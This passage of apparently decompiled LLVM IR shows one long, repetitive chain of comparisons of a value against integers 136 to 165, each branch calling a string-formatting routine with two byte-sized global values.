  %v0_804b626 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b626 = zext i8 %v0_804b626 to i32
  %v2_804b635 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b635, i32* @ebx, align 4
  %v5_804b63c = call i32 @szprintf(i32 %v2_804b635, i32 ptrtoint ([14 x i8]* @global_var_805814e.169 to i32), i32 %v1_804b626, i32 %v1_804b61a)
  br label %dec_label_pc_804b644

dec_label_pc_804b644:                             ; preds = %dec_label_pc_804b611, %dec_label_pc_804b61a
  %v12_804b644 = icmp eq i32 %v11_8049ca7, 136
  %v1_804b64b = icmp eq i1 %v12_804b644, false
  br i1 %v1_804b64b, label %dec_label_pc_804b677, label %dec_label_pc_804b64d

dec_label_pc_804b64d:                             ; preds = %dec_label_pc_804b644
  %v0_804b64d = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b64d = zext i8 %v0_804b64d to i32
  store i32 %v1_804b64d, i32* @edx, align 4
  %v0_804b659 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b659 = zext i8 %v0_804b659 to i32
  %v2_804b668 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b668, i32* @ebx, align 4
  %v5_804b66f = call i32 @szprintf(i32 %v2_804b668, i32 ptrtoint ([14 x i8]* @global_var_805815c.170 to i32), i32 %v1_804b659, i32 %v1_804b64d)
  br label %dec_label_pc_804b677

dec_label_pc_804b677:                             ; preds = %dec_label_pc_804b644, %dec_label_pc_804b64d
  %v12_804b677 = icmp eq i32 %v11_8049ca7, 137
  %v1_804b67e = icmp eq i1 %v12_804b677, false
  br i1 %v1_804b67e, label %dec_label_pc_804b6aa, label %dec_label_pc_804b680

dec_label_pc_804b680:                             ; preds = %dec_label_pc_804b677
  %v0_804b680 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b680 = zext i8 %v0_804b680 to i32
  store i32 %v1_804b680, i32* @edx, align 4
  %v0_804b68c = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b68c = zext i8 %v0_804b68c to i32
  %v2_804b69b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b69b, i32* @ebx, align 4
  %v5_804b6a2 = call i32 @szprintf(i32 %v2_804b69b, i32 ptrtoint ([13 x i8]* @global_var_805816a.171 to i32), i32 %v1_804b68c, i32 %v1_804b680)
  br label %dec_label_pc_804b6aa

dec_label_pc_804b6aa:                             ; preds = %dec_label_pc_804b677, %dec_label_pc_804b680
  %v12_804b6aa = icmp eq i32 %v11_8049ca7, 138
  %v1_804b6b1 = icmp eq i1 %v12_804b6aa, false
  br i1 %v1_804b6b1, label %dec_label_pc_804b6dd, label %dec_label_pc_804b6b3

dec_label_pc_804b6b3:                             ; preds = %dec_label_pc_804b6aa
  %v0_804b6b3 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b6b3 = zext i8 %v0_804b6b3 to i32
  store i32 %v1_804b6b3, i32* @edx, align 4
  %v0_804b6bf = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b6bf = zext i8 %v0_804b6bf to i32
  %v2_804b6ce = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b6ce, i32* @ebx, align 4
  %v5_804b6d5 = call i32 @szprintf(i32 %v2_804b6ce, i32 ptrtoint ([13 x i8]* @global_var_8058177.172 to i32), i32 %v1_804b6bf, i32 %v1_804b6b3)
  br label %dec_label_pc_804b6dd

dec_label_pc_804b6dd:                             ; preds = %dec_label_pc_804b6aa, %dec_label_pc_804b6b3
  %v12_804b6dd = icmp eq i32 %v11_8049ca7, 139
  %v1_804b6e4 = icmp eq i1 %v12_804b6dd, false
  br i1 %v1_804b6e4, label %dec_label_pc_804b710, label %dec_label_pc_804b6e6

dec_label_pc_804b6e6:                             ; preds = %dec_label_pc_804b6dd
  %v0_804b6e6 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b6e6 = zext i8 %v0_804b6e6 to i32
  store i32 %v1_804b6e6, i32* @edx, align 4
  %v0_804b6f2 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b6f2 = zext i8 %v0_804b6f2 to i32
  %v2_804b701 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b701, i32* @ebx, align 4
  %v5_804b708 = call i32 @szprintf(i32 %v2_804b701, i32 ptrtoint ([13 x i8]* @global_var_8058184.173 to i32), i32 %v1_804b6f2, i32 %v1_804b6e6)
  br label %dec_label_pc_804b710

dec_label_pc_804b710:                             ; preds = %dec_label_pc_804b6dd, %dec_label_pc_804b6e6
  %v12_804b710 = icmp eq i32 %v11_8049ca7, 140
  %v1_804b717 = icmp eq i1 %v12_804b710, false
  br i1 %v1_804b717, label %dec_label_pc_804b743, label %dec_label_pc_804b719

dec_label_pc_804b719:                             ; preds = %dec_label_pc_804b710
  %v0_804b719 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b719 = zext i8 %v0_804b719 to i32
  store i32 %v1_804b719, i32* @edx, align 4
  %v0_804b725 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b725 = zext i8 %v0_804b725 to i32
  %v2_804b734 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b734, i32* @ebx, align 4
  %v5_804b73b = call i32 @szprintf(i32 %v2_804b734, i32 ptrtoint ([13 x i8]* @global_var_8058191.174 to i32), i32 %v1_804b725, i32 %v1_804b719)
  br label %dec_label_pc_804b743

dec_label_pc_804b743:                             ; preds = %dec_label_pc_804b710, %dec_label_pc_804b719
  %v12_804b743 = icmp eq i32 %v11_8049ca7, 141
  %v1_804b74a = icmp eq i1 %v12_804b743, false
  br i1 %v1_804b74a, label %dec_label_pc_804b776, label %dec_label_pc_804b74c

dec_label_pc_804b74c:                             ; preds = %dec_label_pc_804b743
  %v0_804b74c = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b74c = zext i8 %v0_804b74c to i32
  store i32 %v1_804b74c, i32* @edx, align 4
  %v0_804b758 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b758 = zext i8 %v0_804b758 to i32
  %v2_804b767 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b767, i32* @ebx, align 4
  %v5_804b76e = call i32 @szprintf(i32 %v2_804b767, i32 ptrtoint ([13 x i8]* @global_var_805819e.175 to i32), i32 %v1_804b758, i32 %v1_804b74c)
  br label %dec_label_pc_804b776

dec_label_pc_804b776:                             ; preds = %dec_label_pc_804b743, %dec_label_pc_804b74c
  %v12_804b776 = icmp eq i32 %v11_8049ca7, 142
  %v1_804b77d = icmp eq i1 %v12_804b776, false
  br i1 %v1_804b77d, label %dec_label_pc_804b7a9, label %dec_label_pc_804b77f

dec_label_pc_804b77f:                             ; preds = %dec_label_pc_804b776
  %v0_804b77f = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b77f = zext i8 %v0_804b77f to i32
  store i32 %v1_804b77f, i32* @edx, align 4
  %v0_804b78b = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b78b = zext i8 %v0_804b78b to i32
  %v2_804b79a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b79a, i32* @ebx, align 4
  %v5_804b7a1 = call i32 @szprintf(i32 %v2_804b79a, i32 ptrtoint ([13 x i8]* @global_var_80581ab.176 to i32), i32 %v1_804b78b, i32 %v1_804b77f)
  br label %dec_label_pc_804b7a9

dec_label_pc_804b7a9:                             ; preds = %dec_label_pc_804b776, %dec_label_pc_804b77f
  %v12_804b7a9 = icmp eq i32 %v11_8049ca7, 143
  %v1_804b7b0 = icmp eq i1 %v12_804b7a9, false
  br i1 %v1_804b7b0, label %dec_label_pc_804b7dc, label %dec_label_pc_804b7b2

dec_label_pc_804b7b2:                             ; preds = %dec_label_pc_804b7a9
  %v0_804b7b2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b7b2 = zext i8 %v0_804b7b2 to i32
  store i32 %v1_804b7b2, i32* @edx, align 4
  %v0_804b7be = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b7be = zext i8 %v0_804b7be to i32
  %v2_804b7cd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b7cd, i32* @ebx, align 4
  %v5_804b7d4 = call i32 @szprintf(i32 %v2_804b7cd, i32 ptrtoint ([14 x i8]* @global_var_80580c2.159 to i32), i32 %v1_804b7be, i32 %v1_804b7b2)
  br label %dec_label_pc_804b7dc

dec_label_pc_804b7dc:                             ; preds = %dec_label_pc_804b7a9, %dec_label_pc_804b7b2
  %v9_804b7dc = icmp eq i32 %v11_8049ca7, 144
  %v1_804b7e3 = icmp eq i1 %v9_804b7dc, false
  br i1 %v1_804b7e3, label %dec_label_pc_804b80f, label %dec_label_pc_804b7e5

dec_label_pc_804b7e5:                             ; preds = %dec_label_pc_804b7dc
  %v0_804b7e5 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b7e5 = zext i8 %v0_804b7e5 to i32
  store i32 %v1_804b7e5, i32* @edx, align 4
  %v0_804b7f1 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b7f1 = zext i8 %v0_804b7f1 to i32
  %v2_804b800 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b800, i32* @ebx, align 4
  %v5_804b807 = call i32 @szprintf(i32 %v2_804b800, i32 ptrtoint ([14 x i8]* @global_var_80581b8.177 to i32), i32 %v1_804b7f1, i32 %v1_804b7e5)
  br label %dec_label_pc_804b80f

dec_label_pc_804b80f:                             ; preds = %dec_label_pc_804b7dc, %dec_label_pc_804b7e5
  %v12_804b80f = icmp eq i32 %v11_8049ca7, 145
  %v1_804b816 = icmp eq i1 %v12_804b80f, false
  br i1 %v1_804b816, label %dec_label_pc_804b842, label %dec_label_pc_804b818

dec_label_pc_804b818:                             ; preds = %dec_label_pc_804b80f
  %v0_804b818 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b818 = zext i8 %v0_804b818 to i32
  store i32 %v1_804b818, i32* @edx, align 4
  %v0_804b824 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b824 = zext i8 %v0_804b824 to i32
  %v2_804b833 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b833, i32* @ebx, align 4
  %v5_804b83a = call i32 @szprintf(i32 %v2_804b833, i32 ptrtoint ([14 x i8]* @global_var_80581c6.178 to i32), i32 %v1_804b824, i32 %v1_804b818)
  br label %dec_label_pc_804b842

dec_label_pc_804b842:                             ; preds = %dec_label_pc_804b80f, %dec_label_pc_804b818
  %v12_804b842 = icmp eq i32 %v11_8049ca7, 146
  %v1_804b849 = icmp eq i1 %v12_804b842, false
  br i1 %v1_804b849, label %dec_label_pc_804b875, label %dec_label_pc_804b84b

dec_label_pc_804b84b:                             ; preds = %dec_label_pc_804b842
  %v0_804b84b = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b84b = zext i8 %v0_804b84b to i32
  store i32 %v1_804b84b, i32* @edx, align 4
  %v0_804b857 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b857 = zext i8 %v0_804b857 to i32
  %v2_804b866 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b866, i32* @ebx, align 4
  %v5_804b86d = call i32 @szprintf(i32 %v2_804b866, i32 ptrtoint ([14 x i8]* @global_var_80581d4.179 to i32), i32 %v1_804b857, i32 %v1_804b84b)
  br label %dec_label_pc_804b875

dec_label_pc_804b875:                             ; preds = %dec_label_pc_804b842, %dec_label_pc_804b84b
  %v12_804b875 = icmp eq i32 %v11_8049ca7, 147
  %v1_804b87c = icmp eq i1 %v12_804b875, false
  br i1 %v1_804b87c, label %dec_label_pc_804b8a8, label %dec_label_pc_804b87e

dec_label_pc_804b87e:                             ; preds = %dec_label_pc_804b875
  %v0_804b87e = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b87e = zext i8 %v0_804b87e to i32
  store i32 %v1_804b87e, i32* @edx, align 4
  %v0_804b88a = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b88a = zext i8 %v0_804b88a to i32
  %v2_804b899 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b899, i32* @ebx, align 4
  %v5_804b8a0 = call i32 @szprintf(i32 %v2_804b899, i32 ptrtoint ([13 x i8]* @global_var_80581e2.180 to i32), i32 %v1_804b88a, i32 %v1_804b87e)
  br label %dec_label_pc_804b8a8

dec_label_pc_804b8a8:                             ; preds = %dec_label_pc_804b875, %dec_label_pc_804b87e
  %v12_804b8a8 = icmp eq i32 %v11_8049ca7, 148
  %v1_804b8af = icmp eq i1 %v12_804b8a8, false
  br i1 %v1_804b8af, label %dec_label_pc_804b8db, label %dec_label_pc_804b8b1

dec_label_pc_804b8b1:                             ; preds = %dec_label_pc_804b8a8
  %v0_804b8b1 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b8b1 = zext i8 %v0_804b8b1 to i32
  store i32 %v1_804b8b1, i32* @edx, align 4
  %v0_804b8bd = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b8bd = zext i8 %v0_804b8bd to i32
  %v2_804b8cc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b8cc, i32* @ebx, align 4
  %v5_804b8d3 = call i32 @szprintf(i32 %v2_804b8cc, i32 ptrtoint ([14 x i8]* @global_var_80581ef.181 to i32), i32 %v1_804b8bd, i32 %v1_804b8b1)
  br label %dec_label_pc_804b8db

dec_label_pc_804b8db:                             ; preds = %dec_label_pc_804b8a8, %dec_label_pc_804b8b1
  %v12_804b8db = icmp eq i32 %v11_8049ca7, 149
  %v1_804b8e2 = icmp eq i1 %v12_804b8db, false
  br i1 %v1_804b8e2, label %dec_label_pc_804b90e, label %dec_label_pc_804b8e4

dec_label_pc_804b8e4:                             ; preds = %dec_label_pc_804b8db
  %v0_804b8e4 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b8e4 = zext i8 %v0_804b8e4 to i32
  store i32 %v1_804b8e4, i32* @edx, align 4
  %v0_804b8f0 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b8f0 = zext i8 %v0_804b8f0 to i32
  %v2_804b8ff = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b8ff, i32* @ebx, align 4
  %v5_804b906 = call i32 @szprintf(i32 %v2_804b8ff, i32 ptrtoint ([14 x i8]* @global_var_80581fd.182 to i32), i32 %v1_804b8f0, i32 %v1_804b8e4)
  br label %dec_label_pc_804b90e

dec_label_pc_804b90e:                             ; preds = %dec_label_pc_804b8db, %dec_label_pc_804b8e4
  %v12_804b90e = icmp eq i32 %v11_8049ca7, 150
  %v1_804b915 = icmp eq i1 %v12_804b90e, false
  br i1 %v1_804b915, label %dec_label_pc_804b941, label %dec_label_pc_804b917

dec_label_pc_804b917:                             ; preds = %dec_label_pc_804b90e
  %v0_804b917 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b917 = zext i8 %v0_804b917 to i32
  store i32 %v1_804b917, i32* @edx, align 4
  %v0_804b923 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b923 = zext i8 %v0_804b923 to i32
  %v2_804b932 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b932, i32* @ebx, align 4
  %v5_804b939 = call i32 @szprintf(i32 %v2_804b932, i32 ptrtoint ([14 x i8]* @global_var_805820b.183 to i32), i32 %v1_804b923, i32 %v1_804b917)
  br label %dec_label_pc_804b941

dec_label_pc_804b941:                             ; preds = %dec_label_pc_804b90e, %dec_label_pc_804b917
  %v12_804b941 = icmp eq i32 %v11_8049ca7, 151
  %v1_804b948 = icmp eq i1 %v12_804b941, false
  br i1 %v1_804b948, label %dec_label_pc_804b974, label %dec_label_pc_804b94a

dec_label_pc_804b94a:                             ; preds = %dec_label_pc_804b941
  %v0_804b94a = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b94a = zext i8 %v0_804b94a to i32
  store i32 %v1_804b94a, i32* @edx, align 4
  %v0_804b956 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b956 = zext i8 %v0_804b956 to i32
  %v2_804b965 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b965, i32* @ebx, align 4
  %v5_804b96c = call i32 @szprintf(i32 %v2_804b965, i32 ptrtoint ([14 x i8]* @global_var_8058219.184 to i32), i32 %v1_804b956, i32 %v1_804b94a)
  br label %dec_label_pc_804b974

dec_label_pc_804b974:                             ; preds = %dec_label_pc_804b941, %dec_label_pc_804b94a
  %v12_804b974 = icmp eq i32 %v11_8049ca7, 152
  %v1_804b97b = icmp eq i1 %v12_804b974, false
  br i1 %v1_804b97b, label %dec_label_pc_804b9a7, label %dec_label_pc_804b97d

dec_label_pc_804b97d:                             ; preds = %dec_label_pc_804b974
  %v0_804b97d = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b97d = zext i8 %v0_804b97d to i32
  store i32 %v1_804b97d, i32* @edx, align 4
  %v0_804b989 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b989 = zext i8 %v0_804b989 to i32
  %v2_804b998 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b998, i32* @ebx, align 4
  %v5_804b99f = call i32 @szprintf(i32 %v2_804b998, i32 ptrtoint ([14 x i8]* @global_var_8058047.150 to i32), i32 %v1_804b989, i32 %v1_804b97d)
  br label %dec_label_pc_804b9a7

dec_label_pc_804b9a7:                             ; preds = %dec_label_pc_804b974, %dec_label_pc_804b97d
  %v12_804b9a7 = icmp eq i32 %v11_8049ca7, 153
  %v1_804b9ae = icmp eq i1 %v12_804b9a7, false
  br i1 %v1_804b9ae, label %dec_label_pc_804b9da, label %dec_label_pc_804b9b0

dec_label_pc_804b9b0:                             ; preds = %dec_label_pc_804b9a7
  %v0_804b9b0 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b9b0 = zext i8 %v0_804b9b0 to i32
  store i32 %v1_804b9b0, i32* @edx, align 4
  %v0_804b9bc = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b9bc = zext i8 %v0_804b9bc to i32
  %v2_804b9cb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b9cb, i32* @ebx, align 4
  %v5_804b9d2 = call i32 @szprintf(i32 %v2_804b9cb, i32 ptrtoint ([13 x i8]* @global_var_8058227.185 to i32), i32 %v1_804b9bc, i32 %v1_804b9b0)
  br label %dec_label_pc_804b9da

dec_label_pc_804b9da:                             ; preds = %dec_label_pc_804b9a7, %dec_label_pc_804b9b0
  %v12_804b9da = icmp eq i32 %v11_8049ca7, 154
  %v1_804b9e1 = icmp eq i1 %v12_804b9da, false
  br i1 %v1_804b9e1, label %dec_label_pc_804ba0d, label %dec_label_pc_804b9e3

dec_label_pc_804b9e3:                             ; preds = %dec_label_pc_804b9da
  %v0_804b9e3 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804b9e3 = zext i8 %v0_804b9e3 to i32
  store i32 %v1_804b9e3, i32* @edx, align 4
  %v0_804b9ef = load i8, i8* @global_var_805b559.40, align 1
  %v1_804b9ef = zext i8 %v0_804b9ef to i32
  %v2_804b9fe = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b9fe, i32* @ebx, align 4
  %v5_804ba05 = call i32 @szprintf(i32 %v2_804b9fe, i32 ptrtoint ([13 x i8]* @global_var_8058234.186 to i32), i32 %v1_804b9ef, i32 %v1_804b9e3)
  br label %dec_label_pc_804ba0d

dec_label_pc_804ba0d:                             ; preds = %dec_label_pc_804b9da, %dec_label_pc_804b9e3
  %v12_804ba0d = icmp eq i32 %v11_8049ca7, 155
  %v1_804ba14 = icmp eq i1 %v12_804ba0d, false
  br i1 %v1_804ba14, label %dec_label_pc_804ba40, label %dec_label_pc_804ba16

dec_label_pc_804ba16:                             ; preds = %dec_label_pc_804ba0d
  %v0_804ba16 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ba16 = zext i8 %v0_804ba16 to i32
  store i32 %v1_804ba16, i32* @edx, align 4
  %v0_804ba22 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ba22 = zext i8 %v0_804ba22 to i32
  %v2_804ba31 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba31, i32* @ebx, align 4
  %v5_804ba38 = call i32 @szprintf(i32 %v2_804ba31, i32 ptrtoint ([13 x i8]* @global_var_8058241.187 to i32), i32 %v1_804ba22, i32 %v1_804ba16)
  br label %dec_label_pc_804ba40

dec_label_pc_804ba40:                             ; preds = %dec_label_pc_804ba0d, %dec_label_pc_804ba16
  %v12_804ba40 = icmp eq i32 %v11_8049ca7, 156
  %v1_804ba47 = icmp eq i1 %v12_804ba40, false
  br i1 %v1_804ba47, label %dec_label_pc_804ba73, label %dec_label_pc_804ba49

dec_label_pc_804ba49:                             ; preds = %dec_label_pc_804ba40
  %v0_804ba49 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ba49 = zext i8 %v0_804ba49 to i32
  store i32 %v1_804ba49, i32* @edx, align 4
  %v0_804ba55 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ba55 = zext i8 %v0_804ba55 to i32
  %v2_804ba64 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba64, i32* @ebx, align 4
  %v5_804ba6b = call i32 @szprintf(i32 %v2_804ba64, i32 ptrtoint ([13 x i8]* @global_var_805824e.188 to i32), i32 %v1_804ba55, i32 %v1_804ba49)
  br label %dec_label_pc_804ba73

dec_label_pc_804ba73:                             ; preds = %dec_label_pc_804ba40, %dec_label_pc_804ba49
  %v12_804ba73 = icmp eq i32 %v11_8049ca7, 157
  %v1_804ba7a = icmp eq i1 %v12_804ba73, false
  br i1 %v1_804ba7a, label %dec_label_pc_804baa6, label %dec_label_pc_804ba7c

dec_label_pc_804ba7c:                             ; preds = %dec_label_pc_804ba73
  %v0_804ba7c = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ba7c = zext i8 %v0_804ba7c to i32
  store i32 %v1_804ba7c, i32* @edx, align 4
  %v0_804ba88 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ba88 = zext i8 %v0_804ba88 to i32
  %v2_804ba97 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba97, i32* @ebx, align 4
  %v5_804ba9e = call i32 @szprintf(i32 %v2_804ba97, i32 ptrtoint ([14 x i8]* @global_var_805825b.189 to i32), i32 %v1_804ba88, i32 %v1_804ba7c)
  br label %dec_label_pc_804baa6

dec_label_pc_804baa6:                             ; preds = %dec_label_pc_804ba73, %dec_label_pc_804ba7c
  %v12_804baa6 = icmp eq i32 %v11_8049ca7, 158
  %v1_804baad = icmp eq i1 %v12_804baa6, false
  br i1 %v1_804baad, label %dec_label_pc_804bad9, label %dec_label_pc_804baaf

dec_label_pc_804baaf:                             ; preds = %dec_label_pc_804baa6
  %v0_804baaf = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804baaf = zext i8 %v0_804baaf to i32
  store i32 %v1_804baaf, i32* @edx, align 4
  %v0_804babb = load i8, i8* @global_var_805b559.40, align 1
  %v1_804babb = zext i8 %v0_804babb to i32
  %v2_804baca = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804baca, i32* @ebx, align 4
  %v5_804bad1 = call i32 @szprintf(i32 %v2_804baca, i32 ptrtoint ([12 x i8]* @global_var_8058269.190 to i32), i32 %v1_804babb, i32 %v1_804baaf)
  br label %dec_label_pc_804bad9

dec_label_pc_804bad9:                             ; preds = %dec_label_pc_804baa6, %dec_label_pc_804baaf
  %v12_804bad9 = icmp eq i32 %v11_8049ca7, 159
  %v1_804bae0 = icmp eq i1 %v12_804bad9, false
  br i1 %v1_804bae0, label %dec_label_pc_804bb0c, label %dec_label_pc_804bae2

dec_label_pc_804bae2:                             ; preds = %dec_label_pc_804bad9
  %v0_804bae2 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bae2 = zext i8 %v0_804bae2 to i32
  store i32 %v1_804bae2, i32* @edx, align 4
  %v0_804baee = load i8, i8* @global_var_805b559.40, align 1
  %v1_804baee = zext i8 %v0_804baee to i32
  %v2_804bafd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bafd, i32* @ebx, align 4
  %v5_804bb04 = call i32 @szprintf(i32 %v2_804bafd, i32 ptrtoint ([14 x i8]* @global_var_8058275.191 to i32), i32 %v1_804baee, i32 %v1_804bae2)
  br label %dec_label_pc_804bb0c

dec_label_pc_804bb0c:                             ; preds = %dec_label_pc_804bad9, %dec_label_pc_804bae2
  %v9_804bb0c = icmp eq i32 %v11_8049ca7, 160
  %v1_804bb13 = icmp eq i1 %v9_804bb0c, false
  br i1 %v1_804bb13, label %dec_label_pc_804bb3f, label %dec_label_pc_804bb15

dec_label_pc_804bb15:                             ; preds = %dec_label_pc_804bb0c
  %v0_804bb15 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bb15 = zext i8 %v0_804bb15 to i32
  store i32 %v1_804bb15, i32* @edx, align 4
  %v0_804bb21 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bb21 = zext i8 %v0_804bb21 to i32
  %v2_804bb30 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb30, i32* @ebx, align 4
  %v5_804bb37 = call i32 @szprintf(i32 %v2_804bb30, i32 ptrtoint ([13 x i8]* @global_var_8058283.192 to i32), i32 %v1_804bb21, i32 %v1_804bb15)
  br label %dec_label_pc_804bb3f

dec_label_pc_804bb3f:                             ; preds = %dec_label_pc_804bb0c, %dec_label_pc_804bb15
  %v12_804bb3f = icmp eq i32 %v11_8049ca7, 161
  %v1_804bb46 = icmp eq i1 %v12_804bb3f, false
  br i1 %v1_804bb46, label %dec_label_pc_804bb72, label %dec_label_pc_804bb48

dec_label_pc_804bb48:                             ; preds = %dec_label_pc_804bb3f
  %v0_804bb48 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bb48 = zext i8 %v0_804bb48 to i32
  store i32 %v1_804bb48, i32* @edx, align 4
  %v0_804bb54 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bb54 = zext i8 %v0_804bb54 to i32
  %v2_804bb63 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb63, i32* @ebx, align 4
  %v5_804bb6a = call i32 @szprintf(i32 %v2_804bb63, i32 ptrtoint ([14 x i8]* @global_var_8058290.193 to i32), i32 %v1_804bb54, i32 %v1_804bb48)
  br label %dec_label_pc_804bb72

dec_label_pc_804bb72:                             ; preds = %dec_label_pc_804bb3f, %dec_label_pc_804bb48
  %v12_804bb72 = icmp eq i32 %v11_8049ca7, 162
  %v1_804bb79 = icmp eq i1 %v12_804bb72, false
  br i1 %v1_804bb79, label %dec_label_pc_804bba5, label %dec_label_pc_804bb7b

dec_label_pc_804bb7b:                             ; preds = %dec_label_pc_804bb72
  %v0_804bb7b = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bb7b = zext i8 %v0_804bb7b to i32
  store i32 %v1_804bb7b, i32* @edx, align 4
  %v0_804bb87 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bb87 = zext i8 %v0_804bb87 to i32
  %v2_804bb96 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb96, i32* @ebx, align 4
  %v5_804bb9d = call i32 @szprintf(i32 %v2_804bb96, i32 ptrtoint ([14 x i8]* @global_var_805829e.194 to i32), i32 %v1_804bb87, i32 %v1_804bb7b)
  br label %dec_label_pc_804bba5

dec_label_pc_804bba5:                             ; preds = %dec_label_pc_804bb72, %dec_label_pc_804bb7b
  %v12_804bba5 = icmp eq i32 %v11_8049ca7, 163
  %v1_804bbac = icmp eq i1 %v12_804bba5, false
  br i1 %v1_804bbac, label %dec_label_pc_804bbd8, label %dec_label_pc_804bbae

dec_label_pc_804bbae:                             ; preds = %dec_label_pc_804bba5
  %v0_804bbae = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bbae = zext i8 %v0_804bbae to i32
  store i32 %v1_804bbae, i32* @edx, align 4
  %v0_804bbba = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bbba = zext i8 %v0_804bbba to i32
  %v2_804bbc9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bbc9, i32* @ebx, align 4
  %v5_804bbd0 = call i32 @szprintf(i32 %v2_804bbc9, i32 ptrtoint ([14 x i8]* @global_var_80582ac.195 to i32), i32 %v1_804bbba, i32 %v1_804bbae)
  br label %dec_label_pc_804bbd8

dec_label_pc_804bbd8:                             ; preds = %dec_label_pc_804bba5, %dec_label_pc_804bbae
  %v12_804bbd8 = icmp eq i32 %v11_8049ca7, 164
  %v1_804bbdf = icmp eq i1 %v12_804bbd8, false
  br i1 %v1_804bbdf, label %dec_label_pc_804bc0b, label %dec_label_pc_804bbe1

dec_label_pc_804bbe1:                             ; preds = %dec_label_pc_804bbd8
  %v0_804bbe1 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804bbe1 = zext i8 %v0_804bbe1 to i32
  store i32 %v1_804bbe1, i32* @edx, align 4
  %v0_804bbed = load i8, i8* @global_var_805b559.40, align 1
  %v1_804bbed = zext i8 %v0_804bbed to i32
  %v2_804bbfc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bbfc, i32* @ebx, align 4
  %v5_804bc03 = call i32 @szprintf(i32 %v2_804bbfc, i32 ptrtoint ([14 x i8]* @global_var_8058219.184 to i32), i32 %v1_804bbed, i32 %v1_804bbe1)
  br label %dec_label_pc_804bc0b

dec_label_pc_804bc0b:                             ; preds = %dec_label_pc_804bbd8, %dec_label_pc_804bbe1
  %v12_804bc0b = icmp eq i32 %v11_8049ca7, 165
  %v1_804bc12 = icmp eq i1 %v12_804bc0b, false
  br i1 %v1_804bc12, label %dec_label_pc_804bc3e, label %dec_label_pc_804bc14

